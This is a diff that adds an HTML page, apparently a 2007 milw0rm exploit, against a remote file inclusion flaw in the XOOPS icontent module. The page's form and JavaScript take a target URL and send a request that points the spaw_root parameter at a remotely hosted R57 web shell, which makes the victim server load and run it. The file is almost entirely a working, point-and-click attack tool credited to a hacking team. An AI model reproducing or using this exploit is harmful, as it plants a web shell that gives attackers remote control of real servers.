@@ -1,0 +1,83 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>XOOPS Module icontent v.1.0 Remote File Inclusion Exploit</title>
+
+<script language="JavaScript">
+
+//'===============================================================================================
+//'[Script Name: XOOPS Module icontent v.1.0
+//'[Author     : Mahmood_ali
+//'[S.Page     : http://mirror.in.th/sourceforge.net/x/xo/xoops/xoops2-mod_icontent.zip
+//'===============================================================================================
+
+//'[[V.Code]]------------------------------------------------------
+//'
+//'include $spaw_root.'config/spaw_control.config.php';
+//'include $spaw_root.'class/toolbars.class.php';
+//'include $spaw_root.'class/lang.class.php';
+//'
+//'[[V.Code]]---------------------------------------------------------
+
+//# Tryag.Com
+//# ...
+
+
+
+
+   var path="/modules/icontent/include/wysiwyg/"
+   var adres="spaw_control.class.php" //File name
+   var acik ="?spaw_root=" // Line 15
+   var shell="http://lppm.uns.ac.id/r57.txt?" // R57Shell
+
+   function command(){
+       if (document.rfi.target1.value==""){
+          alert("Failed..");
+      return false;
+    }
+
+
+
+  rfi.action= document.rfi.target1.value+path+adres+acik+shell; // Ready
+  rfi.submit(); // Form Submit
+   }
+</script>
+
+</head>
+
+<body bgcolor="#000000">
+<center>
+
+<p><b><font face="Arial" size="2" color="#FFFFFF">XOOPS Module icontent 
+v.1.0 Remote File Inclusion Exploit</font></b></p>
+
+<p></p>
+<form method="post" target="getting" name="rfi" onSubmit="command();">
+    <b><font face="Tahoma" size="1" color="#FF0000">Target:</font><font 
+face="Tahoma" size="1" 
+color="#FFFF00">[http://[target]/[scriptpath]</font><font color="#00FF00" 
+size="2" face="Tahoma">
+  </font><font color="#FF0000" size="2">&nbsp;</font></b>
+  <input type="text" name="target1" size="20" style="background-color: 
+#808000" onmouseover="javascript:this.style.background='#808080';" 
+onmouseout="javascript:this.style.background='#808000';"></p>
+  <p><input type="submit" value="Gonder" name="B1"><input type="reset" 
+value="Sifirla" name="B2"></p>
+</form>
+<p><br>
+<iframe name="getting" height="337" width="633" scrolling="yes" 
+frameborder="0"></iframe>
+</p>
+
+<b><font face="Lucida Handwriting" size="5" 
+color="#FF0000">Mahmood_ali</font></b><p>
+<b><a href="http://tryag.com/cc">
+<font face="Lucida Handwriting" size="5" 
+color="#FFFFFF">TrYaG-Team</font></a></b></p>
+</p>
+</center>
+</body>
+
+</html>
+
+# milw0rm.com [2007-06-01]
